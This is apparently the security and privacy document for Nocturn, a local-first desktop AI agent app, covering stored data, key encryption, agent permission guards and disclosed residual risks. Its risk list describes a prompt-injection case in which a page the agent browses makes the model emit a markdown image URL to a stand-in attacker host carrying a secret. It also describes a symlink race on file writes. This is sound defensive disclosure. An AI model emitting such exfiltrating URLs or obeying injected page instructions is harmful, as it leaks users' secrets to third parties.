# Security & Privacy

Nocturn is built local-first: no accounts, no telemetry, no backend of its own.
This document describes what the app stores, what leaves the machine, and how
secrets are protected.

## What leaves your computer

- **Prompts and tool results** are sent only to the API provider *you*
  configured (your key, your Base URL) — the same traffic as any OpenAI-compatible
  chat client. Nocturn adds no middleman.
- **Browser Use** drives a local headless Chromium via CDP. Pages the agent
  visits are fetched by your machine, from your network.
- Nothing else is transmitted. There is no analytics, crash reporting, or update
  phone-home.

## What is stored locally

- `%APPDATA%/com.haloui.app` (Windows) — settings, sessions, projects, notes,
  automation schedules, usage stats, browser-view state.
- API keys are stored in plain settings.json **unless** key encryption is
  enabled (recommended): then keys are AES-256-GCM encrypted (RustCrypto
  `aes-gcm`, standard `nonce ‖ ciphertext ‖ tag` layout), and the vault key is
  derived from your master password with **Argon2id** (OWASP parameters,
  19 MiB / t=2). Vaults created on the legacy PBKDF2 KDF are upgraded to
  Argon2id transparently on the next successful unlock — all encrypted fields
  are re-keyed in place.
- Project checkpoints are plain-text snapshots under
  `appdata/checkpoints/` — they contain your code; disk encryption is your friend.

## Agent tool surface

The agent can (depending on permission mode): read/write/delete files under the
paths it is given, run shell commands, use MCP servers, and drive a local
browser. Guards:

- permission modes (Plan / Ask / Edit / Full) gate mutating tools;
- per-task allowlists remember approved commands;
- hooks (PreToolUse) can block any call;
- Hard Limits abort a run when token/$ budgets are exceeded.

Review what you approve — "Always for this task" persists the decision in the
session store.

## Known residual risks (design trade-offs)

- **Symlink TOCTOU on path writes.** File writes validate the path
  (canonicalize + sensitive-path check) and then write through the normal
  filesystem. A local process racing the agent could swap a path component
  for a symlink between check and write. Single-user local machine: the
  attacker must already run as the same user. Hardening (open with
  `FILE_FLAG_OPEN_REPARSE_POINT` on Windows / `O_NOFOLLOW` on Unix) is
  tracked as future work.
- **Broad import reads.** Settings import, plugin import and knowledge-base
  indexing can read arbitrary user-chosen files (system locations are
  rejected). This is the feature; the webview process is the trust boundary.
- **Executable configs.** `hooks.json` / `mcp.json` define commands that the
  app will execute. They are only written through an explicit confirmation
  flow (`allowExecutableConfigs`) — treat any file claiming to be a Nocturn
  config as untrusted input.
- **Remote images in model output.** The CSP allows `img-src https:` so
  markdown images returned by providers render inline. A prompt injection
  (e.g. in a page the agent reads via Browser Use) could abuse this as a
  passive exfiltration channel: `![](https://attacker/?d=<secret>)` sends one
  GET outside the `connect-src` fence. This is an accepted trade-off —
  rendering provider images is a deliberate feature; if you do not need
  remote images, remove `https:` from `img-src` in `src-tauri/tauri.conf.json`.
- **Lyrics lookups (opt-in, off by default).** The media mini-bar can fetch
  synced lyrics from lrclib.net — a free, keyless API. When enabled, it
  sends the track title and artist name (nothing else). Playback state and
  control never leave the machine: they go through the OS media controls
  (SMTC on Windows), with no Spotify account or network involved.
- **YouTube player (opt-in, radio with the Spotify integration).** Uses
  only the official embed from `www.youtube-nocookie.com` — the sanctioned
  embedding path, no keys, no OAuth, no stream extraction or ad bypass.
  The CSP widens `frame-src` to that host only (static in tauri.conf.json;
  the app never renders third-party iframes from chat content — raw HTML in
  markdown is disabled, so the widened frame-src is exercised exclusively by
  the player). Video thumbnails are fetched from `i.ytimg.com` (covered by
  the existing `img-src https:`). You paste links yourself; the queue and
  volume live in localStorage. Playback of the collapsed window continues
  by design (the iframe stays mounted).

## Reporting

Please open a GitHub issue for anything security-related you find. For
sensitive reports, contact the maintainers privately first.
